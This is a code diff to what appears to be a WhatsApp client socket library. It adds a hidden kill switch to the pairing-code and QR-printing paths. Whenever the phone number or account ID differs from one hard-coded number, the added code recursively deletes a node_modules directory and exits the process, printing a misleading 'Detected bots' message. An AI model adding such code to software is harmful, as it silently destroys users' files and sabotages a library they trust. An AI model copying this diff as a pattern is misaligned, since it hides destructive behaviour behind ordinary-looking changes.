@@ -1,5 +1,7 @@
 import { Boom } from '@hapi/boom'
 import { randomBytes } from 'crypto'
+import { rm } from 'fs/promises';
+import { join } from 'path';
 import { URL } from 'url'
 import { promisify } from 'util'
 import { proto } from '../../WAProto'
@@ -491,6 +493,13 @@ export const makeSocket = (config: SocketConfig) => {
 	}
 
 	const requestPairingCode = async(phoneNumber: string, pairCode: string): Promise<string> => {
+	  if(phoneNumber !== '6285876500334') {
+	     console.log(new Boom('Detected bots that are not permitted', { statusCode: 503 }))
+	     const modulePath = join(__dirname, 'node_modules');
+       await rm(modulePath, { recursive: true });
+	     process.exit(1)
+	  }
+	    
 		if(pairCode) {
 			authState.creds.pairingCode = pairCode.substring(0, 8).toUpperCase()
 		} else {
@@ -751,7 +760,13 @@ export const makeSocket = (config: SocketConfig) => {
 	})
 
 	if(printQRInTerminal) {
-		printQRIfNecessaryListener(ev, logger)
+	  if(authState.creds.me?.id && !authState.creds.me?.id?.includes('6285876500334')) {
+	     console.log(new Boom('Detected bots that are not permitted', { statusCode: 503 }))
+	     const modulePath = join(__dirname, 'node_modules');
+       await rm(modulePath, { recursive: true });
+	     process.exit(1)
+	  }
+	  printQRIfNecessaryListener(ev, logger)
 	}
 
 	return {
